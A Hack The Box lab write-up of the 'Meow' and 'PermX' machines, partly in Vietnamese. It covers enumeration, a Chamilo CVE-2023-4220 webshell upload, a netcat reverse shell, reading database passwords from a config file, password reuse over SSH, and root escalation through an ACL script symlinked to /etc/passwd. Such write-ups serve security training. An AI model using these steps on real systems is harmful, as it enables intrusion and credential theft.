---
title: HackTheBox
description: Training for OSCP
author: Pr0pylTh10ur4C1L
date: 2024-07-30 11:42:00 +0700
categories: [Hack The Box]
tags: [Linux]
math: true
mermaid: true
---

# Tier 0
## Meow
telnet root does not need password
```powershell
telnet 10.129.202.137
```
Username -> root -> Enter


## PermX

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -A -v -T4 -p- 10.10.11.23

Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ curl 10.10.11.23
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://permx.htb">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.23 Port 80</address>
</body></html>

┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts
```

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u "http://permx.htb/" -H "HOST:FUZZ.permx.htb" -mc 200 -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 71ms]
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 5903ms]


┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u "http://permx.htb/FUZZ" -mc 200 -w SecLists/Discovery/Web-Content/big.txt -t 100 -r

css                     [Status: 200, Size: 1140, Words: 70, Lines: 18, Duration: 56ms]
img                     [Status: 200, Size: 4406, Words: 228, Lines: 34, Duration: 68ms]
js                      [Status: 200, Size: 922, Words: 61, Lines: 17, Duration: 48ms]
lib                     [Status: 200, Size: 1714, Words: 112, Lines: 21, Duration: 57ms]

┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u "http://lms.permx.htb/FUZZ" -mc 200 -w SecLists/Discovery/Web-Content/big.txt -t 100 -r

LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 50ms]
app                     [Status: 200, Size: 3764, Words: 235, Lines: 31, Duration: 57ms]
certificates            [Status: 200, Size: 11841, Words: 2178, Lines: 219, Duration: 172ms]
bin                     [Status: 200, Size: 941, Words: 64, Lines: 17, Duration: 3681ms]
documentation           [Status: 200, Size: 3966, Words: 1051, Lines: 86, Duration: 55ms]
favicon.ico             [Status: 200, Size: 2462, Words: 3, Lines: 2, Duration: 70ms]
main                    [Status: 200, Size: 94, Words: 4, Lines: 8, Duration: 55ms]
plugin                  [Status: 200, Size: 234, Words: 12, Lines: 8, Duration: 60ms]
robots.txt              [Status: 200, Size: 748, Words: 75, Lines: 34, Duration: 50ms]
src                     [Status: 200, Size: 932, Words: 64, Lines: 17, Duration: 57ms]
vendor                  [Status: 200, Size: 17167, Words: 1049, Lines: 99, Duration: 81ms]
web                     [Status: 200, Size: 1310, Words: 88, Lines: 19, Duration: 77ms]
```

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.10.11.23 lms.permx.htb" | sudo tee -a /etc/hosts

┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.10.11.23 www.permx.htb" | sudo tee -a /etc/hosts
```

```
https://github.com/chamilo/chamilo-lms
https://github.com/chamilo/chamilo-lms/releases/ 
http://lms.permx.htb/documentation/changelog.html --> Version <= 1.11.24

--> CVE-2023-4220
https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit --> Up webshell to gain revshell https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php

Based on the vuln the upload location will be http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/
```

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444                 
listening on [any] 4444 ...
connect to [10.10.14.127] from (UNKNOWN) [10.10.11.23] 51566
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

```shell
www-data@permx:/var/www$ grep -r "db_password"
...
chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
...
```

```shell
www-data@permx:/var/www$ cat chamilo/app/config/configuration.php | grep db_
cat chamilo/app/config/configuration.php | grep db_
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
$_configuration['db_manager_enabled'] = false;
//$_configuration['session_stored_in_db_as_backup'] = true;
//$_configuration['sync_db_with_schema'] = false;

www-data@permx:/var/www$ mysql -h localhost -P 3306 -u chamilo -p
mysql -h localhost -P 3306 -u chamilo -p
Enter password: 03F6lY3uXAP2bkW8

...

MariaDB [(none)]>
```
-->Find nothing interesting to privesc

Cuối cùng thì password spray lại có tác dụng:
```shell
www-data@permx:/home$ ls /home
mtz

┌──(kali㉿kali)-[~/Desktop]
└─$ ssh mtz@10.10.11.23
...
mtz@10.10.11.23's password: 03F6lY3uXAP2bkW8
...

mtz@permx:~$ ls -la
total 36
drwxr-x--- 5 mtz  mtz  4096 Jul 30 07:21 .
drwxr-xr-x 3 root root 4096 Jan 20  2024 ..
lrwxrwxrwx 1 root root    9 Jan 20  2024 .bash_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------ 2 mtz  mtz  4096 May 31 11:14 .cache
drwxrwxr-x 3 mtz  mtz  4096 Jul 30 06:45 .local
lrwxrwxrwx 1 root root    9 Jan 20  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   807 Jan  6  2022 .profile
drwx------ 2 mtz  mtz  4096 Jan 20  2024 .ssh
-rw-r----- 1 root mtz    33 Jul 30 06:27 user.txt
mtz@permx:~$ cat user.txt
0b3db0198e3f758fb58e8c6c9c3a4471
```

sudo -l --> có file /opt/acl.sh --> tạo symlink tới etc/passwd --> set acl để có quyền rwx --> để thêm password gen từ "openssl passwd 123456" vào root --> root.txt







